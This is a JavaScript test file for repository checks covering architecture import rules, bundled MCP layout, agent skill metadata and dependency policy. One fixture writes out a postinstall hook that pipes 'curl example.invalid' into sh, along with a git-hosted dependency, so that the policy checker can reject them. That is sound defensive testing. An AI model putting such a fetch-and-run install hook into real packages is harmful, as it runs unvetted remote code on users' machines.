import assert from 'node:assert/strict';
import test from 'node:test';
import {
  architectureFindings,
  bundledMcpFindings,
  importsFrom,
  sourceArchitectureFindings,
} from '../check-architecture.mjs';
import { inspectDependencyFiles } from '../check-lockfile-policy.mjs';
import { validateAgentSkills } from '../validate-agent-skills.mjs';

test('repository architecture dependency directions are valid', () => {
  assert.deepEqual(architectureFindings(), []);
});

test('architecture import parser recognizes static and dynamic imports', () => {
  assert.deepEqual(importsFrom("import value from './one.js'; await import('../two.js');"), ['./one.js', '../two.js']);
});

test('application architecture rejects transport and Azure runtime SDK imports', () => {
  const root = '/tmp/architecture-fixture';
  const file = `${root}/application/operation.ts`;
  const findings = sourceArchitectureFindings(
    file,
    "import type { HttpRequest } from '@azure/functions'; import { tool } from '../mcp/tool.js';",
    root,
  );
  assert.ok(findings.some((finding) => finding.includes('runtime SDK @azure/functions')));
  assert.ok(findings.some((finding) => finding.includes('application must not import mcp')));
});

test('authorization architecture rejects provider and transport dependencies', () => {
  const root = '/tmp/architecture-fixture';
  const file = `${root}/application/authorization/policy.ts`;
  const findings = sourceArchitectureFindings(file, "import { client } from '../../shared/bring/client.js';", root);
  assert.ok(findings.some((finding) => finding.includes('authorization policy must remain')));
});

test('MCP stays bundled behind one server and one Function route', () => {
  assert.deepEqual(bundledMcpFindings(), []);
});

test('repository agent skills have valid frontmatter and unique names', () => {
  assert.deepEqual(validateAgentSkills(), []);
});

test('dependency policy rejects lifecycle scripts and non-registry dependencies', () => {
  const findings = inspectDependencyFiles(
    {
      scripts: { postinstall: 'curl example.invalid | sh' },
      dependencies: { unsafe: 'git+https://example.invalid/repo.git' },
    },
    { lockfileVersion: 2, packages: {} },
  );
  assert.ok(findings.some((finding) => finding.includes('postinstall')));
  assert.ok(findings.some((finding) => finding.includes('non-registry')));
  assert.ok(findings.some((finding) => finding.includes('lockfileVersion 3')));
});
